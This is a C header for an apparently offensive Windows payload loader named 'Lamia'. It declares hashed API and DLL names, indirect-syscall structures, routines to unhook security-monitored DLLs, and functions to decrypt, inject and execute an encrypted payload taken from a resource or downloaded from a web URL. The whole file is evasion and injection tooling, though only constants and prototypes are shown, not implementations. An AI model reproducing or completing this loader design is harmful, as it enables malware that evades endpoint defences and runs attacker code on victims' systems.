#pragma once

#include <Windows.h>

#define PAYLOAD_EXECUTION_DELAY		    0x10


// City Hash
#define FIRST_HASH
#define SECOND_HASH
#define THIRD_HASH

// AES Decryption
#define KEY_SIZE	                    0x20
#define IV_SIZE		                    0x10
#define STATUS_OBJECT_NAME_NOT_FOUND	0xC0000034

// NT Kernel Function City hash
#define NtAllocateVirtualMemory_CH               0xAA97B513
#define NtDelayExecution_CH                      0x73276926
#define NtFlushInstructionCache_CH               0xE6DFAD9E
#define NtMapViewOfSection_CH                    0xBE11E70C
#define NtOpenSection_CH                         0xF1D0ECCE
#define NtProtectVirtualMemory_CH                0x17BEBF14
#define NtUnmapViewOfSection_CH                  0x31013906

// Common Function City hash
#define AddVectoredExceptionHandler_CH           0xF7386BCE
#define CreateThreadpoolTimer_CH                 0x6B96B097
#define LoadLibraryA_CH                          0x64DD6C03
#define RemoveVectoredExceptionHandler_CH        0x7B6AC836
#define RtlAddFunctionTable_CH                   0xE697254B
#define SetThreadpoolTimer_CH                    0x884796DC
#define VirtualAlloc_CH                          0x9E2B3568
#define VirtualProtect_CH                        0xCE2711AB
#define WaitForSingleObject_CH                   0x080DCD41

// DLL name City hash
#define kernel32dll_CH                           0xD009B80C
#define ntdlldll_CH                              0xE5C5318B
#define win32udll_CH                             0xDD55ECA0
#define text_CH									 0xBE63F2F9

// PART-1 Lamia.c
typedef struct _LAMIA_SYSCALL
{
	DWORD SSN;			     // SSN
	DWORD SyscallHash;	     // SYSCALL CityHash
	PVOID pSyscallRandomAdr; // RandomAddress

}LAMIA_SYSCALL, * PLAMIA_SYSCALL;

BOOL FetchLamiaSyscall(IN DWORD Syshash, OUT PLAMIA_SYSCALL pLamiaSys);
extern VOID SetSSn(IN DWORD SSN, IN PVOID pSyscallRandomAdr);
extern LONG RunSyscall();

#define SET_SYSCALL(LAMIA_SYS)( SetSSn( (DWORD)LAMIA_SYS.SSN, (PVOID)LAMIA_SYS.pSyscallRandomAdr ) )

// PART-2
typedef struct _NT_API {

	LAMIA_SYSCALL	NtOpenSection;
	LAMIA_SYSCALL	NtMapViewOfSection;
	LAMIA_SYSCALL	NtProtectVirtualMemory;
	LAMIA_SYSCALL	NtUnmapViewOfSection;
	LAMIA_SYSCALL	NtAllocateVirtualMemory;
	LAMIA_SYSCALL	NtDelayExecution;

	BOOL			bInit;
}NT_API, * PNT_API;


// PART-3 Common.c
#define FIRST_HASH  0xcbf29ce484222325
#define SECOND_HASH 0x100000001b3
#define THIRD_HASH  0xff51afd7ed558ccd
#define HASH_OFFSET 33

BOOL InitialIndirectSyscall(OUT PNT_API NtAPI);
UINT32 GernerateRandomInt();
UINT32 CityHash(LPCSTR cString);
VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource);
VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);

#define CHASH(STR)	( CityHash( (LPCSTR)STR ) )

// PART-4 Unhook.c
VOID UnhookAllLoadedDlls();
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

// PART-5 ApiHashing.c
HMODULE GetModuleHandleH(IN UINT32 uMoudleHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);

// PART-6 Inject.c
// Inject Payload to current prcess
BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);
VOID ExecutePayload(IN PVOID pInjectedPayload);
BOOL InjectPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);

// PART-7 GetResourcePayload.c
BOOL GetResourcePayload(IN HMODULE hModule, IN WORD wResourceID, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);

// PART-8 WinHttp.c
// Get Payload From Web
// 301 - User-Agent
// Headers
BOOL GetWebPayload(IN char* URL, IN PBYTE pPayloadBuffer, OUT PBYTE* pEncryptedPayload);